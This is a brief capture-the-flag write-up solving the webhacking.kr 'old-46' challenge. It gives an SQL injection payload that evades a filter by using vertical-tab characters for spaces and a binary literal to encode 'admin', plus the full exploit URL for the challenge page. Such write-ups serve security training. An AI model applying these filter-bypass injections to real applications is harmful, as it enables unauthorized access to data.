# Webhacking old-46 Solution

another sql injection. this time we can't use 0x, so we use 0b.
```5%0bor%0bid%0blike%0b0b0110000101100100011011010110100101101110#```

this is equivalent to `5 or id like 'admin'#`

```
https://webhacking.kr/challenge/web-23/?lv=5%0bor%0bid%0blike%0b0b0110000101100100011011010110100101101110#
```